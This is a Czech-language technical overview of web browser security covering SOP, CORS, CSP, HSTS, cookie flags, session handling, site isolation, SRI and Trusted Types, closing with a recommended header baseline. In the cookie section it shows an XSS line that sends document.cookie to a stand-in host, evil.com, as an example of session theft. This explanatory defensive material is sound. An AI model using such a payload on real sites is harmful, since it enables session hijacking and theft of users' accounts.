Tohle je velmi široké téma, takže to vezmu jako technický přehled na úrovni vývojáře / bezpečnostního architekta. Rozdělím ho na principy izolace webu, HTTP bezpečnostní hlavičky, cookies, útoky a vrstvenou obranu.

# 1. Same-Origin Policy (SOP)

**Same-Origin Policy (zásada stejného původu)** je jeden z nejdůležitějších bezpečnostních mechanismů webových prohlížečů. Je to pravidlo, které říká:

> Skript načtený z jednoho původu nesmí libovolně číst nebo manipulovat s daty jiného původu.

Původ (*origin*) je definován trojicí:

```
origin = (schéma, hostitel, port)
```

Například:

```
https://example.com:443
```

je jiný origin než:

```
http://example.com:80
https://api.example.com:443
https://example.com:8443
```

Porovnání:

| URL                                        | Stejný origin? |
| ------------------------------------------ | -------------- |
| [https://app.cz/a](https://app.cz/a)       | ano            |
| [https://app.cz/b](https://app.cz/b)       | ano            |
| [http://app.cz](http://app.cz)             | ne             |
| [https://api.app.cz](https://api.app.cz)   | ne             |
| [https://app.cz:8080](https://app.cz:8080) | ne             |

---

## Proč SOP existuje

Představme si, že uživatel je přihlášen:

```
https://bank.cz
```

Má cookie:

```
session=abc123
```

Útočník vytvoří:

```
https://evil.cz
```

JavaScript:

```javascript
fetch("https://bank.cz/account")
```

Bez SOP by mohl přečíst:

```json
{
 "balance": 500000,
 "card": "1234..."
}
```

SOP zabrání:

```
evil.cz
    |
    |  X
    |
bank.cz
```

---

# 2. Co SOP chrání

SOP omezuje:

## DOM přístup

Zakázáno:

```javascript
iframe.contentWindow.document
```

pokud:

```
parent origin != iframe origin
```

---

## AJAX / Fetch

Například:

```javascript
fetch(
 "https://api.example.com/users"
)
```

Prohlížeč blokuje čtení odpovědi.

---

## Storage

Oddělené:

```
localStorage
sessionStorage
IndexedDB
```

Každý origin má vlastní prostor.

Například:

```
https://bank.cz
 └── localStorage

https://evil.cz
 └── jiný localStorage
```

---

# 3. SOP není absolutní izolace

Existují výjimky.

Například:

## Obrázky

Toto je dovoleno:

```html
<img src="https://example.com/image.png">
```

ale JavaScript nemůže číst pixely:

```javascript
canvas.getImageData()
```

pokud chybí CORS.

---

## Form POST

Historicky:

```html
<form action="https://bank.cz/change">
```

je povolen.

Proto existuje CSRF.

---

# 4. CORS – řízené prolomení SOP

CORS = Cross-Origin Resource Sharing

Je mechanismus, kterým server říká:

> "Tento jiný origin smí číst moje odpovědi."

---

Například:

Frontend:

```
https://app.example.com
```

API:

```
https://api.example.com
```

Request:

```
GET /users
Origin:
https://app.example.com
```

Server odpoví:

```
Access-Control-Allow-Origin:
https://app.example.com
```

Prohlížeč povolí čtení.

---

## Nebezpečná konfigurace

Špatně:

```
Access-Control-Allow-Origin: *
```

spolu s:

```
Access-Control-Allow-Credentials: true
```

To je chyba.

Umožňuje:

* krádež dat
* čtení API odpovědí

---

Bezpečně:

```
Access-Control-Allow-Origin:
https://trusted.example.com

Access-Control-Allow-Credentials:
true
```

---

# 5. HTTP Security Headers

Moderní web používá hlavičky jako další obrannou vrstvu.

---

# Content Security Policy (CSP)

Nejdůležitější obrana proti XSS.

CSP říká:

> Odkud smí stránka načítat a spouštět obsah.

---

Příklad:

```
Content-Security-Policy:
default-src 'self';
script-src 'self';
style-src 'self';
img-src 'self';
```

Význam:

```
default-src 'self'
```

vše pouze vlastní doména.

---

## Obrana proti XSS

Útok:

```html
<script>
fetch('/cookie')
</script>
```

CSP:

```
script-src 'self'
```

zablokuje.

---

## Nebezpečné CSP

Špatně:

```
script-src *
```

nebo:

```
script-src 'unsafe-inline'
```

Protože dovolí:

```html
<script>alert(1)</script>
```

---

# CSP nonce

Moderní aplikace používají nonce:

Server:

```
Content-Security-Policy:

script-src 'nonce-X7a92'
```

HTML:

```html
<script nonce="X7a92">

app.start();

</script>
```

Útočník vloží:

```html
<script>
alert(1)
</script>
```

bez nonce → blokováno.

---

# CSP hash

Alternativa:

```
script-src 'sha256-AbCdEf'
```

Povolí přesně daný skript.

---

# 6. HSTS

HTTP Strict Transport Security

Chrání proti:

* downgrade útokům
* SSL stripping

---

Hlavička:

```
Strict-Transport-Security:

max-age=31536000;
includeSubDomains;
preload
```

Význam:

```
max-age
```

jak dlouho platí HTTPS povinnost.

Například:

```
31536000 sekund
= 1 rok
```

---

Útok bez HSTS:

Uživatel:

```
http://bank.cz
```

Útočník:

```
HTTP → HTTPS
```

změní na:

```
HTTP
```

a odchytává.

---

S HSTS:

Prohlížeč automaticky:

```
http://bank.cz
       |
       v
https://bank.cz
```

---

# 7. X-Frame-Options / Clickjacking

Clickjacking:

Útočník vloží:

```html
<iframe src="bank.cz">
```

a překryje ho tlačítkem.

Uživatel kliká:

```
"Vyhrát cenu"
```

ale kliká:

```
Převést peníze
```

---

Ochrana:

Starší:

```
X-Frame-Options:
DENY
```

nebo:

```
SAMEORIGIN
```

---

Moderní:

CSP:

```
frame-ancestors 'none'
```

---

# 8. Cookie Security

Cookies jsou častý cíl.

---

## Secure

Cookie:

```
Set-Cookie:

session=abc;
Secure
```

znamená:

posílat pouze přes HTTPS.

---

## HttpOnly

Nejdůležitější proti krádeži session.

Cookie:

```
session=abc;
HttpOnly
```

JavaScript:

```javascript
document.cookie
```

nevidí:

```
session
```

---

Bez:

XSS:

```javascript
fetch(
"https://evil.com/?c="+document.cookie
)
```

---

S HttpOnly:

```
document.cookie=""
```

---

## SameSite

Chrání proti CSRF.

---

### SameSite=Strict

Cookie pouze:

```
same-site
```

Nejvyšší ochrana.

---

### SameSite=Lax

Moderní default.

Povolí:

```
GET navigace
```

zakáže:

```
POST cross-site
```

---

### SameSite=None

Nutné pro cross-site:

musí být:

```
Secure
```

---

Příklad:

```
Set-Cookie:

SESSION=xyz;
HttpOnly;
Secure;
SameSite=Lax
```

---

# 9. Session Security

Bezpečná session:

```
ID = náhodné 128+ bitů
```

Například:

```
9f82c1e8b72...
```

Ne:

```
userid=123
```

---

Po loginu:

špatně:

```
session zachována
```

správně:

```
login
 |
 v
nové session ID
```

tedy:

```
session regeneration
```

---

# 10. Izolace moderního webu

Moderní browsery používají:

## Site Isolation

Každý web běží v jiném procesu.

Například:

```
chrome.exe

bank.cz
   |
   process 1


evil.cz
   |
   process 2
```

Chrání proti:

* Spectre
* memory leakům

---

## COOP

Cross-Origin Opener Policy

```
Cross-Origin-Opener-Policy:

same-origin
```

Oddělí:

```
window.opener
```

---

## COEP

Cross-Origin Embedder Policy

```
Cross-Origin-Embedder-Policy:

require-corp
```

Vyžaduje explicitní povolení vloženého obsahu.

---

## CORP

Cross-Origin Resource Policy

Například:

```
Cross-Origin-Resource-Policy:

same-origin
```

---

# 11. Bezpečné vkládání třetích stran

Rizikové:

```html
<script src="https://cdn.com/lib.js">
```

Protože:

CDN kompromitováno → XSS.

---

## Subresource Integrity

SRI:

```html
<script
src="https://cdn.com/app.js"
integrity="sha256-ABC">
</script>
```

Browser:

```
hash souboru?
```

Pokud:

```
ano → spustit
ne → blokovat
```

---

# 12. HTML sanitizace

Nikdy:

```javascript
element.innerHTML=userInput
```

Nebezpečné.

---

Použít:

```javascript
textContent
```

místo:

```javascript
innerHTML
```

---

Příklad:

Špatně:

```javascript
div.innerHTML =
username
```

Dobře:

```javascript
div.textContent =
username
```

---

# 13. Trusted Types

Moderní obrana proti DOM XSS.

CSP:

```
require-trusted-types-for 'script'
```

Zakáže:

```javascript
innerHTML = data
```

dokud není explicitně bezpečné.

---

# 14. Layered Defense – doporučená architektura

Bezpečný web:

```
                 Internet

                    |
                    v

              HTTPS + HSTS

                    |
                    v

          Reverse proxy / WAF

                    |
                    v

              CSP + CORS

                    |
                    v

          Secure cookies

                    |
                    v

        Authentication + Sessions

                    |
                    v

        Input validation

                    |
                    v

        Output encoding

                    |
                    v

              Database
```

---

# 15. Doporučený baseline pro produkci

Typická konfigurace:

```
Strict-Transport-Security:
max-age=31536000; includeSubDomains


Content-Security-Policy:
default-src 'self';
script-src 'self' 'nonce-xyz';
object-src 'none';
frame-ancestors 'none';


X-Content-Type-Options:
nosniff


Referrer-Policy:
strict-origin-when-cross-origin


Permissions-Policy:
camera=(),
microphone=()


Set-Cookie:

SESSION=...
Secure;
HttpOnly;
SameSite=Lax
```

---

# Shrnutí

Moderní bezpečnost webu nestojí na jedné ochraně:

| Mechanismus      | Obrana                      |
| ---------------- | --------------------------- |
| SOP              | izolace originů             |
| CORS             | řízený cross-origin přístup |
| CSP              | XSS                         |
| HSTS             | HTTPS downgrade             |
| HttpOnly cookies | krádež session              |
| SameSite         | CSRF                        |
| SRI              | kompromitované CDN          |
| COOP/COEP/CORP   | izolace procesů             |
| Trusted Types    | DOM XSS                     |
| output encoding  | injekce                     |

Nejodolnější aplikace kombinují **izolaci původu + bezpečné cookies + CSP + správnou práci s daty + minimální oprávnění**.
